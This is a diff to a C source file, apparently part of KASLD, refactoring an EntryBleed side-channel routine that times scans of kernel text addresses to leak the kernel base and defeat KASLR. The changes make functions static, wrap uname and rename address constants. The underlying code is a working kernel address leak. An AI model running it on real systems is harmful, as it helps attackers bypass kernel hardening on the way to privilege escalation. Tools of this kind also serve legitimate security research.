@@ -53,7 +53,6 @@
 
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
-#include "include/kasld/internal.h"
 #include "include/sidechannel.h"
 #include <errno.h>
 #include <stdio.h>
@@ -251,11 +250,11 @@ struct kernel_info offsets[] = {
 };
 // clang-format on
 
-struct utsname get_kernel_version() {
+static struct utsname get_kernel_version(void) {
   struct utsname u;
-  int rv = uname(&u);
+  int rv = kasld_uname(&u);
   if (rv != 0) {
-    fprintf(stderr, "[-] uname()\n");
+    fprintf(stderr, "[-] kasld_uname()\n");
     exit(KASLD_EXIT_UNAVAILABLE);
   }
   return u;
@@ -264,7 +263,7 @@ struct utsname get_kernel_version() {
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
 #define KERNEL_VERSION_SIZE_BUFFER 512
 
-int detect_kernel_version() {
+static int detect_kernel_version(void) {
   struct utsname u;
   char kernel_version[KERNEL_VERSION_SIZE_BUFFER];
 
@@ -291,12 +290,12 @@ int detect_kernel_version() {
 }
 
 #define STEP 0x100000ul
-#define ARR_SIZE (unsigned long)((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
+#define ARR_SIZE (unsigned long)((KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / STEP)
 
-uint64_t leak_syscall_entry(uint64_t offset) {
+static uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
   uint64_t min = ~0, addr = ~0;
-  uint64_t SCAN_START = KERNEL_BASE_MIN + offset;
+  uint64_t SCAN_START = KERNEL_TEXT_MIN + offset;
 
   int iterations = 100;
   int dummy_iterations = 5;
@@ -322,13 +321,13 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     // printf("%llx %ld\n", (SCAN_START + index * STEP), data[index]);
   }
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr - offset;
 
   return 0;
 }
 
-unsigned long get_kernel_addr_entrybleed() {
+static unsigned long get_kernel_addr_entrybleed(void) {
   int cpu = detect_cpu_vendor();
 
   if (cpu == CPU_VENDOR_UNKNOWN) {
@@ -369,7 +368,7 @@ unsigned long get_kernel_addr_entrybleed() {
     }
   }
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr;
 
   return 0;
